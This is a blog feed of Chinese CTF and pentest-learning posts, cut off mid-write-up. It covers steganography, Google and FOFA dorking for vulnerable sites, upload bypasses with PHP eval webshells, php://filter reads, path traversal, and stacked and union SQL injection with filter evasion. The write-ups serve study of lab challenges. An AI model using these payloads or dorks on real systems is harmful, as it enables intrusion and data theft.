<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTFshow之misc</title>
      <link href="/2021/01/24/ctfshow-zhi-misc/"/>
      <url>/2021/01/24/ctfshow-zhi-misc/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="大吉大利杯"><a href="#大吉大利杯" class="headerlink" title="大吉大利杯"></a>大吉大利杯</h1><h2 id="请问大吉杯的签到是在这里签吗"><a href="#请问大吉杯的签到是在这里签吗" class="headerlink" title="请问大吉杯的签到是在这里签吗"></a>请问大吉杯的签到是在这里签吗</h2><p>得到二维码1.png</p><p>通过foremost分离得到另外3个</p><p>内容分别是：</p><p>1：请问DJB CTF比赛的签到处在什么地方</p><p>2：还要往前走……是不是在这个路口转弯呢?<br>3：好像没有岔路了，一直往前走试试看<br>4：咦，这是死胡同，是不是哪里走错路了</p><p>关键的地方在2.png，用stegsolve，<img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8824%E6%97%A52307_1.png" alt></p><p>得到图案，对比发现是猪圈密码，对照解码得到flag：<br>flag{dajiadoaidjb}</p><h2 id="十八般兵器"><a href="#十八般兵器" class="headerlink" title="十八般兵器"></a>十八般兵器</h2><p>顺序：刀、枪、剑、戟、斧、钺、钩、叉、鞭、锏、锤、戈、镋、棍、槊、棒、矛、耙</p><p>下载得到rar文件，打开得到批注是：2021牛年大吉，这个就是解压密码</p><p>hint1:JPHS<br>hint2:用Notepad++打开试试？<br>hint3:前十种兵器对应10进制，后八种对应8进制</p><p>用jphswin打开，用seek，将棒.jpg保存，得到txt文本，下拉到最后得到34635</p><p>将18个兵器后面藏的数字一次写下来，并且按照题目给的顺序排列。再加上提示说前10个是10进制，后8个是8进制，可以得到两组数字：</p><p>1361 4399 9223 1635 2581 7639 7978 5870 0963 935 30440 53720 46055 62766 10613 34635 37242 30575<br>两组分别合并 得到<br>136143999223163525817639797858700963935<br>3044053720460556276610613346353724230575</p><p>16进制：</p><p>666c61677b43544673686f775f31305f</p><p>62415f42616e5f62316e675f51317d</p><p>666c61677b43544673686f775f31305f62415f42616e5f62316e675f51317d</p><p>16→text：flag{CTFshow_10_bA_Ban_b1ng_Q1}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>谷歌语法</title>
      <link href="/2021/01/18/gu-ge-yu-fa/"/>
      <url>/2021/01/18/gu-ge-yu-fa/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、谷歌语法是什么"><a href="#一、谷歌语法是什么" class="headerlink" title="一、谷歌语法是什么"></a>一、谷歌语法是什么</h1><p>谷歌语法就是利用搜索引擎在渗透测试过程搜索到特定页面的一种语法</p><h1 id="二、如何利用谷歌语法"><a href="#二、如何利用谷歌语法" class="headerlink" title="二、如何利用谷歌语法"></a>二、如何利用谷歌语法</h1><h2 id="谷歌语法基础的符号："><a href="#谷歌语法基础的符号：" class="headerlink" title="谷歌语法基础的符号："></a>谷歌语法基础的符号：</h2><p><strong>“xxx”: 将要搜索的关键字用引号括起来  (表示完全匹配，即关键词不能分开，顺序也不能变)</strong></p><p>例如：腾讯课堂如果不加“ ”的话，就会针对腾讯和课堂进行拆分，既对腾讯进行搜索也对课堂进行搜索，所以加上“ ”的话就会对腾讯课堂进行绑定，只对腾讯课堂进行搜索</p><p><strong>+：“xxx” +baidu.com</strong> </p><p>  <strong>搜索xxx与baidu.com 相关的内容</strong></p><p>例如：腾讯课堂 +ke.qq.com，那么这里就会显示ke.qq.com相关的内容</p><p><strong>-：“xxx” -baidu.com</strong> </p><p>  <strong>搜索结果里面除去baidu.com 相关的内容</strong></p><p>例如：腾讯课堂 -ke.qq.com，这里再搜索的时候，就会把这个网址屏蔽掉</p><h2 id="谷歌语法的基础使用"><a href="#谷歌语法的基础使用" class="headerlink" title="谷歌语法的基础使用"></a>谷歌语法的基础使用</h2><p>在渗透测试的过程中，运用谷歌语法能快速地帮我们找到可能存在漏洞的页面</p><h3 id="谷歌语法常用搜索参数："><a href="#谷歌语法常用搜索参数：" class="headerlink" title="谷歌语法常用搜索参数："></a>谷歌语法常用搜索参数：</h3><h4 id="site："><a href="#site：" class="headerlink" title="site："></a>site：</h4><p>指定域名，如：site:edu.cn 搜索教育网站</p><h4 id="inurl："><a href="#inurl：" class="headerlink" title="inurl："></a>inurl：</h4><p>用于搜索包含的url关键词的网页，如：inurl:uploads 文件上传，搜索关于公司有关的网址中含有login的网页，</p><h4 id="intitle："><a href="#intitle：" class="headerlink" title="intitle："></a>intitle：</h4><p>搜索网页标题中的关键字，如：</p><p>intitle:”index of /admin” robots.txt </p><p>intitle:”robots.txt”</p><h4 id="intext："><a href="#intext：" class="headerlink" title="intext："></a>intext：</h4><p>搜索网页正文中的关键字，如：intext:登陆/注册/用户名/密码</p><h4 id="filetype："><a href="#filetype：" class="headerlink" title="filetype："></a>filetype：</h4><p>按指定文件类型即文件后缀名搜索，如：filetpye:php/asp/jsp</p><h2 id="谷歌语法拓展"><a href="#谷歌语法拓展" class="headerlink" title="谷歌语法拓展"></a>谷歌语法拓展</h2><h3 id="查找后台"><a href="#查找后台" class="headerlink" title="查找后台"></a>查找后台</h3><p>site:xx.com intext:管理|后台|登陆|用户名|密码|系统|帐号|admin|login|sys|managetem|password|username </p><p>site:xx.com inurl:login|admin|manage|member|admin_login|login_admin|system|login|user</p><h3 id="查找sql注入漏洞"><a href="#查找sql注入漏洞" class="headerlink" title="查找sql注入漏洞"></a>查找sql注入漏洞</h3><p>inurl:.php?id=23 公司</p><p>inurl:.asp?id=11</p><h3 id="查找上传点："><a href="#查找上传点：" class="headerlink" title="查找上传点："></a>查找上传点：</h3><p>site:xx.com inurl:file| uploadfile</p><h3 id="查找敏感信息泄露"><a href="#查找敏感信息泄露" class="headerlink" title="查找敏感信息泄露"></a>查找敏感信息泄露</h3><p>intitle:”Index of /admin”</p><p>intitle:”Index of /root”</p><p>intitle:”Index of /“ +password.txt</p><p>intitle:phpinfo()或者inurl:phpinfo.php</p><h3 id="查找未授权访问phpmyadmin"><a href="#查找未授权访问phpmyadmin" class="headerlink" title="查找未授权访问phpmyadmin"></a>查找未授权访问phpmyadmin</h3><p>inurl:.php? intext:CHARACTER_SETS,COLLATIONS, ?intitle:phpmyadmin</p><h2 id="三、网络空间搜索引擎的使用"><a href="#三、网络空间搜索引擎的使用" class="headerlink" title="三、网络空间搜索引擎的使用"></a>三、网络空间搜索引擎的使用</h2><h3 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h3><p>FOFA 是白帽汇推出的一款网络空间搜索引擎,它通过进行网络空间测绘,能够帮助研究人员或者企业迅速进行网络资产匹配,例如进行漏洞影响范围分析、应用分布统计、应用流行度等。</p><p>FOFA 搜索引擎检索到的内容主要是服务器，数据库，某个网站管理后台，路由器，交换机，公共IP的打印机，网络摄像头，门禁系统，Web服务 ……</p><p>网址：<a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a></p><h3 id="FOFA怎么用？"><a href="#FOFA怎么用？" class="headerlink" title="FOFA怎么用？"></a>FOFA怎么用？</h3><p>FOFA查询语法，类似谷歌语法，FOFA的语法也是简单易懂，主要分为检索字段以及运算符，所有的查询语句都是由这两种元素组成的。</p><p>常用语法：</p><p>1、domain= “qq.com”    //搜索qq.com所有的子域名</p><p>2、host=”edu.cn”      //从url中搜索edu.cn</p><p>3、ip= “11.1.1.1”     //搜索ip</p><p>4、server=”apache”     //搜索服务是apache的网站</p><p>5、os=”windows”      //搜素操作系统是windows的网站</p><p>6、port=3306 或者 protocol==”mysql” //搜索mysql数据库的网站</p><p>7、app=”致远”    //搜索致远oa办公系统搭建的网站，还可以搜设备，比如监控的</p><p>8、title=”登陆”      //从标题中搜索登陆</p><p>9、header=”thinkphp”    //从http的头里面搜thinkphp</p><p>跟钟馗之眼很像啊</p>]]></content>
      
      
      <categories>
          
          <category> 谷歌语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Google </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Upload-Labs</title>
      <link href="/2021/01/17/upload-labs/"/>
      <url>/2021/01/17/upload-labs/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>upload-labs</code>是一个使用<code>php</code>语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</p><h2 id="PASS-01"><a href="#PASS-01" class="headerlink" title="PASS-01"></a>PASS-01</h2><p>问题：该文件不允许上传，请上传.jpg|.png|.gif类型的文件,当前文件类型为：.php</p><p>解决：bp抓包，发现抓不到，说明是前端检测</p><pre><code>Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;666.php&quot;Content-Type: image/jpeg&lt;?php @eval($_POST[&#39;666&#39;]);?&gt;</code></pre><p>注意蚁剑连接的时候路径为：/upload/666.php</p><h2 id="PASS-02"><a href="#PASS-02" class="headerlink" title="PASS-02"></a>PASS-02</h2><p>模仿01</p><p>也成功了</p><h2 id="PASS-03"><a href="#PASS-03" class="headerlink" title="PASS-03"></a>PASS-03</h2><p>继续重复</p><p>哎<del>~</del></p><p>不行了，后端验证了开始↓↓↓</p><p>提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！            </p><p>解决：用PHP 的别名进行黑名单绕过，如 php2, php3, php4, php5, phps, pht, phtm, phtml</p><h2 id="PASS-04"><a href="#PASS-04" class="headerlink" title="PASS-04"></a>PASS-04</h2><p>.htaccess的设置：</p><pre><code>&lt;FilesMatch &quot;1.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>这里要上传的文件名字为1.jpg</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux笔记</title>
      <link href="/2021/01/15/linux-bi-ji/"/>
      <url>/2021/01/15/linux-bi-ji/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Linux命令复习："><a href="#Linux命令复习：" class="headerlink" title="Linux命令复习："></a>Linux命令复习：</h1><p>mkdir (file)：创建一个文本夹</p><p>touch 创建txt文件</p><p>dir：查看当前的目录</p><p>ls -la：查看当前文件并更多信息（如：文件所被给予的权限）</p><p>rm <file>：-rf强行删除文件</file></p><p>rmdir（英文全拼：remove directory）：删除一个空的目录</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试笔记</title>
      <link href="/2021/01/15/shen-tou-ce-shi-bi-ji/"/>
      <url>/2021/01/15/shen-tou-ce-shi-bi-ji/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><h2 id="msf工具"><a href="#msf工具" class="headerlink" title="msf工具"></a>msf工具</h2><p>建立一个交互式的shell</p><pre><code>shellpython -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;#前提是找到该框架的漏洞，并且打入进去</code></pre><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>如果遇到网络问题：service networking restart重启一下网络服务</p><p>-p 8011（指定8011端口）</p><p>-F（快速扫描） -iL（从文本文件里面扫描主机列表，多线程）1.txt -v</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuctf之Web</title>
      <link href="/2021/01/15/buuctf-zhi-web/"/>
      <url>/2021/01/15/buuctf-zhi-web/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="2021-01-15"><a href="#2021-01-15" class="headerlink" title="2021-01-15"></a>2021-01-15</h1><h2 id="第一题-HCTF-2018-WarmUp"><a href="#第一题-HCTF-2018-WarmUp" class="headerlink" title="第一题:[HCTF 2018]WarmUp"></a>第一题:[HCTF 2018]WarmUp</h2><p>这里懒得上传图片了，所以就直接笔记了</p><p>源代码里面有1.source.php，所以打开以后还会发先2.hint.php</p><p>1打开后会发现是代码审计</p><pre><code>&lt;?php    highlight_file(__FILE__);    class emmm    {        public static function checkFile(&amp;$page)        {            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];            if (! isset($page) || !is_string($page)) {                echo &quot;you can&#39;t see it&quot;;                return false;                /**isset在php中用来判断变量是否声明，该函数返回布尔类型的值，即true/false。isset只能用于变量，因为传递任何其它参数都将造成解析错误。is_string用来检查传入的值是否为字符串**/            }            if (in_array($page, $whitelist)) {                return true;                /**in_array — 检查数组中是否存在某个值，这里判断page是否存在于whitelist数 组 中 ， 存 在 则 返 回 true**/            }            $_page = mb_substr(                $page,                0,                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)            );            /**            对mb_substr函数的解释：函数返回字符串的一部分，针对中文            &lt;?php               echo mb_substr(&quot;菜鸟教程&quot;, 0, 2);               // 输出：菜鸟            ?&gt;            mb_strpos (要被检查的字符串,要搜索的字符串)            &lt;?php             $str = &#39;http://www.feiniaomy.com&#39;;             echo mb_strpos($str,&#39;niao&#39;);            ?&gt;            输出结果：14            这里整个嵌套意思是截取page中’?‘前部分             **/            if (in_array($_page, $whitelist)) {                return true;            }            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)            );            /**            这里也就是说进行了两次url解码，一次是服务器自动解码，一次是此处解码            **/            if (in_array($_page, $whitelist)) {                return true;            }            echo &quot;you can&#39;t see it&quot;;            return false;        }    }    if (! empty($_REQUEST[&#39;file&#39;])        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])#这段代码意思就是响应的file参数不能为空，而且必须是是字符串，并且还要检查在checkfile里面检查，这里将我们的的值传到emmm类里面的checkFile函数，这三个值通过&amp;&amp;逻辑与运算符连接也就是要求这块函数的返回值要全为真才能执行if里面的文件包含的代码 否则就执行else里面的图片代码#    ) {        include $_REQUEST[&#39;file&#39;];        exit;    } else {        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;    }  ?&gt; </code></pre><p>2打开后会发现：flag not here, and flag in ffffllllaaaagggg</p><p>也就是说flag在这个文件里面</p><p>所以说这个经过分析完以后，就是结构/?file=source.php?/../../../../ffffllllaaaagggg</p><p>然后就是对？进行url编码%253F这里../就是</p><p>所以就是/?file=hint.php%253f/../../../../../../../../ffffllllaaaagggg</p><p>同样/?file=source.php%253f/../../../../../../../../ffffllllaaaagggg都可以</p><p>因为source与hint都在whitelist的白名单里面，这里就是类似于将这个题目定向</p><p>没什么东西</p><p>flag{7c4ca688-51e1-4235-958a-fad970c48f7b}</p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>输入1得</p><pre><code>array(2) {  [0]=&gt;  string(1) &quot;1&quot;  [1]=&gt;  string(7) &quot;hahahah&quot;}</code></pre><p>输入1’</p><pre><code>error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;1&#39;&#39;&#39; at line 1</code></pre><p>报错了</p><p>输入：1’ or 1=1#</p><pre><code>array(2) {  [0]=&gt;  string(1) &quot;1&quot;  [1]=&gt;  string(7) &quot;hahahah&quot;}array(2) {  [0]=&gt;  string(1) &quot;2&quot;  [1]=&gt;  string(12) &quot;miaomiaomiao&quot;}array(2) {  [0]=&gt;  string(6) &quot;114514&quot;  [1]=&gt;  string(2) &quot;ys&quot;}</code></pre><p>爆出一些没有用的数组，但是说明了万能钥匙好用，存在注入点</p><p>输入：1’ union select 1,2#</p><pre><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre><p>这可能是进入了某一步算法中了反正联合查询应该是凉了（全剧终）</p><p>考虑堆叠注入（学到了）：</p><p>原理：在sql语句中以;表示一个语句的结束，如果一个sql语句结束后再接着一个sql语句，就会执行这两条sql语句</p><p>输入：1’;show databases;#</p><pre><code>array(1) {  [0]=&gt;  string(11) &quot;ctftraining&quot;}array(1) {  [0]=&gt;  string(18) &quot;information_schema&quot;}array(1) {  [0]=&gt;  string(5) &quot;mysql&quot;}array(1) {  [0]=&gt;  string(18) &quot;performance_schema&quot;}array(1) {  [0]=&gt;  string(9) &quot;supersqli&quot;}array(1) {  [0]=&gt;  string(4) &quot;test&quot;}</code></pre><p>输入：-1’;show tables from supersqli;#</p><pre><code>array(1) {  [0]=&gt;  string(16) &quot;1919810931114514&quot;}array(1) {  [0]=&gt;  string(5) &quot;words&quot;}</code></pre><p>输入：-1’;show columns from  <code>1919810931114514</code>;#(字符串为表名操作时要加反引号)``</p><pre><code>array(6) {  [0]=&gt;  string(4) &quot;flag&quot;  [1]=&gt;  string(12) &quot;varchar(100)&quot;  [2]=&gt;  string(2) &quot;NO&quot;  [3]=&gt;  string(0) &quot;&quot;  [4]=&gt;  NULL  [5]=&gt;  string(0) &quot;&quot;}</code></pre><p>输入：1’;show columns from words;#（查看表words表的字段）</p><pre><code>array(6) {  [0]=&gt;  string(2) &quot;id&quot;  [1]=&gt;  string(7) &quot;int(10)&quot;  [2]=&gt;  string(2) &quot;NO&quot;  [3]=&gt;  string(0) &quot;&quot;  [4]=&gt;  NULL  [5]=&gt;  string(0) &quot;&quot;}array(6) {  [0]=&gt;  string(4) &quot;data&quot;  [1]=&gt;  string(11) &quot;varchar(20)&quot;  [2]=&gt;  string(2) &quot;NO&quot;  [3]=&gt;  string(0) &quot;&quot;  [4]=&gt;  NULL  [5]=&gt;  string(0) &quot;&quot;}</code></pre><p><strong>注意（重点）</strong>：</p><pre><code>  - 1&#39; or 1=1#    希望展示所有内容  - 一般SQL代码中会有这copy么一段select * from （表名） where = 变量，  - 当通过注入后会变成select * from （表名）  where id = 变量 OR 1=1;  - 就会使百where后面的表达式变成一句可有可无的表达式，因为or前面执行成功，且1=1为真。不会报错  - 就与select * from （表名）相等然后就可以通过这种句式来取得当前数据表中所有的用户信息答。  - 但显然失败了，猜测表名应该是words，所以才没有显示flag，所以可能是select * from words where id = 变量</code></pre><pre><code>1&#39;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#</code></pre><p>解释：</p><pre><code>- rename table `words` to `words1`; 修改表 words 改名为其它，- rename table `1919810931114514` to `words`;修改表 1919810931114514 改名为 words ，- alter table `words` change `flag` `id` varchar(100) character set utf8 collate utf8_general_ci not NULL;修改列 flag 改名为 id ，- 或者可以 alter table words add id int unsigned not Null auto_increment primary key;在表 1919810931114514 插入一列 id，- 然后再 1&#39; or 1=1# ，展示flag</code></pre><pre><code>flag{e5334182-fc16-4c20-8ac3-753301d2925d}</code></pre><p>VARCHAR(size)：保存可变长度的字符串（可包含字母、数字以及特殊字符）。在括号中指定字符串的最大长度。最多 255 个字符。<strong>注释：</strong>如果值的长度大于 255，则被转换为 TEXT 类型。</p><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>php伪协议</p><p>特点：文件包含，/?file=flag.php</p><p>payload:file=php://filter/read=convert.base64-encode/resource=flag.php</p><p>得：PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MzEyOTZhNWUtZjRiMy00ZTY1LTg5MGEtOThjNjZhMWU5MWI0fQo=</p><p>base64得：</p><pre><code>&lt;?phpecho &quot;Can you find out the flag?&quot;;//flag{31296a5e-f4b3-4e65-890a-98c66a1e91b4}</code></pre><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>小马：</p><pre><code>GIF89a&lt;?php @eval($_POST[&#39;666&#39;]);?&gt;</code></pre><p>首先上传.php文件发现对后缀进行了限制</p><p>改为shell.php.png同时抓包删除png</p><p>得到一个页面以后查看源代码发现：</p><p>Upload Success! Look here~ ./uplo4d/3d694425bf5c9803db0c7b3d776cd2f1.png</p><p>发现确实存在，但是被重命名了，而且变成了一个png</p><p>重新尝试后缀绕过shell.phtml（通过抓包修改）</p><p>得到：</p><p>Upload Success! Look here~ ./uplo4d/bd914ca4997d34857501cefab0064162.phtml</p><p>回到根目录查看flag即可</p><p>或者数据终端cat /flag</p><h1 id="2021-01-25"><a href="#2021-01-25" class="headerlink" title="2021-01-25"></a>2021-01-25</h1><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>用户名：1’ or 1=1#</p><p>密码：123</p><p>得到flag：flag{161e4d70-8d13-4f80-8a96-c01d5eb7b540}</p><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>查看源代码：</p><pre><code>                &lt;!--        $cat=$_GET[&#39;cat&#39;];        echo $cat;        if($cat==&#39;dog&#39;){            echo &#39;Syc{cat_cat_cat_cat}&#39;;        }        --&gt;</code></pre><p>构造参数?cat=dog,结果直接得到了flag：flag{1fb1365e-7d13-4ee4-94ec-e93656f4d96e}</p><p>什么情况？？就这啊？</p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>输入1的结果与输入3-2的结果一样。所以判断为整数型注入，接下来构造注入语句：</p><p>当我输入-1 union select 1,2#和其他字符转的时候，都会被转义，所以就很有可能是被转义了，联合查询放弃，考虑堆叠注入：</p><p>1;show databases;#（展现所有数据库）</p><p>得到结果：</p><pre><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; ctf ) Array ( [0] =&gt; ctftraining ) Array ( [0] =&gt; information_schema ) Array ( [0] =&gt; mysql ) Array ( [0] =&gt; performance_schema ) Array ( [0] =&gt; test )</code></pre><p>我感觉在test里面，构造语句：1;show tables from test;#结果是一点不好使</p><p>当输入1;show tables;时候回显：</p><pre><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag )</code></pre><p>ok，看wp吧：也不知道是怎么想的，</p><h3 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h3><p>输入的内容为*,1</p><p>内置的sql语句为：select $post[‘query’]||flag from Flag</p><p>如果$post[‘query’]的数据为<em>,1，sql语句就变成了select </em>,1||flag from Flag（此时||是逻辑“或”）也就是select *,1 from Flag，也就是直接查询出了Flag表中的所有内</p><h3 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h3><p>1.输入 1 或 0 查询结果如图，要想办法让 ||不是逻辑或<br>官方给的 payload 是1;set sql_mode=PIPES_AS_CONCAT;select 1</p><p>拼接一下就是select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</p><p>关于 sql_mode : 它定义了 MySQL 应支持的 SQL 语法，以及应该在数据上执行何种确认检查，其中的PIPES_AS_CONCAT将 ||视为字符串的连接操作符而非 “或” 运算符</p><p>2.这个模式下进行查询的时候，使用字母连接会报错，使用数字连接才会查询出数据，因为这个||相当于是将 select 1 和 select flag from flag 的结果拼接在一起</p><p>自我理解：sql_mode=PIPES_AS_CONCAT将后面查询的结果同时输出</p><p>不错，挺好的题，盗：</p><pre><code>附加几种常见的sql_mode值的介绍：几种常见的mode介绍ONLY_FULL_GROUP_BY：出现在select语句、HAVING条件和ORDER BY语句中的列，必须是GROUP BY的列或者依赖于GROUP BY列的函数列。NO_AUTO_VALUE_ON_ZERO：该值影响自增长列的插入。默认设置下，插入0或NULL代表生成下一个自增长值。如果用户希望插入的值为0，而该列又是自增长的，那么这个选项就有用了。STRICT_TRANS_TABLES：在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制NO_ZERO_IN_DATE：这个模式影响了是否允许日期中的月份和日包含0。如果开启此模式，2016-01-00是不允许的，但是0000-02-01是允许的。它实际的行为受到 strict mode是否开启的影响1。NO_ZERO_DATE：设置该值，mysql数据库不允许插入零日期。它实际的行为受到 strictmode是否开启的影响2。ERROR_FOR_DIVISION_BY_ZERO：在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回NULLNO_AUTO_CREATE_USER：禁止GRANT创建密码为空的用户NO_ENGINE_SUBSTITUTION：如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常PIPES_AS_CONCAT：将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似ANSI_QUOTES：启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符</code></pre><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>后端结构是username=’’passwd=’’</p><p>注入开始：username=’1’ or 1 = 1#passwd=’’</p><p>得到回显：<strong>Hello admin！</strong></p><p><strong>Your password is ‘817b66fd2bafc98336e2618cf0e66578’</strong></p><p>构造username=’admin’passwd=’817b66fd2bafc98336e2618cf0e66578’</p><p>密码是flag嘛。。。flag{817b66fd2bafc98336e2618cf0e66578}也不对，难道密码是个表？？继续构造：</p><p>username=’admin’ union select table_name from 817b66fd2bafc98336e2618cf0e66578#’passwd=’’</p><p>得到：<strong>Table ‘geek.817b66fd2bafc98336e2618cf0e66578’ doesn’t exist</strong></p><p>继续：username=’admin’ order by 3#’passwd=’’</p><p>返回结果与成功登陆admin结果一样</p><p>继续admin’ order by 4#</p><p>得到回显：<strong>Unknown column ‘4’ in ‘order clause’</strong>，好，3列确定了，继续构造：1’ union select 1,2,3#得到：</p><p><strong>Hello 2！</strong><br><strong>Your password is ‘3’</strong></p><p>懂了：</p><pre><code>1&#39; union select 1,2,database()#</code></pre><p>得到数据库<strong>geek</strong></p><pre><code>1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</code></pre><p>得到回显：<strong>Hello 2！Your password is ‘geekuser,l0ve1ysq1’</strong></p><pre><code>1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;l0ve1ysq1&#39;#</code></pre><p>得到回显：<strong>Hello 2！Your password is ‘id,username,password’</strong></p><pre><code>1&#39; union select 1,2,group_concat(password) from l0ve1ysq1#</code></pre><p>flag{7aa6a786-5f9b-4a75-a742-5b380e79dcd2}</p><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>其实这个题与lovesql相似</p><p>进行了过滤,输入1’ or 1=1#发现变成了： ‘1=1#’</p><p>可能过滤字符： select or and union from where</p><p>输入：</p><pre><code>1&#39; oorr 1=1#</code></pre><p>得到：<strong>Hello admin！Your password is ‘232dc50f903a404ea874ef30b680a9a4’</strong></p><pre><code>1&#39; uniunionon selselectect 1,2,3#</code></pre><p>得到回显：<strong>Hello 2！Your password is ‘3’</strong></p><pre><code>1&#39; uniunionon selselectect 1,2,database()#</code></pre><p>得到回显：<strong>Hello 2！Your password is ‘geek’</strong>（数据库geek）</p><pre><code>1&#39; uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_name=&#39;geek&#39;#</code></pre><p>得到回显：<strong>Table ‘infmation_schema.tables’ doesn’t exist</strong></p><p>注意：是information，故information改为infoorrmation</p><p>但是没有返回值</p><pre><code>1&#39; uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=&#39;geek&#39;#</code></pre><p>得到：<strong>Hello 2！Your password is ‘b4bsql,geekuser’</strong></p><p>得到表：b4bsql,geekuser</p><pre><code>1&#39; uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39;#</code></pre><p>得到回显：<strong>Hello 2！Your password is 